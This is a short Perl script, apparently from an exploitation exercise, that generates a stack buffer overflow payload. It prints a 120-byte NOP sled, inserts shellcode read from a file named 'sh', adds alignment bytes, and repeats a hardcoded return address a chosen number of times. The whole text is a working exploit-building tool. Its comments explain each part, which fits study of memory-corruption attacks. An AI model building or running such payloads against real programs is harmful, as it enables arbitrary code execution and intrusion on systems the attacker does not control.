# USAGE perl shed_sh [Repetition of Return address]
# Perl script to create shellcode with NOP SLED and return address
print "\x90" x 120;     #NOP SLED
open(DATA, "<sh"); while(<DATA>) {print "$_";} #SHELLCODE, Read from file "sh"
print "AAA";    #3 bytes to align
print "\x10\xd5\xff\xff" x $ARGV[0]; #RET Address repeated ARGV[0] times
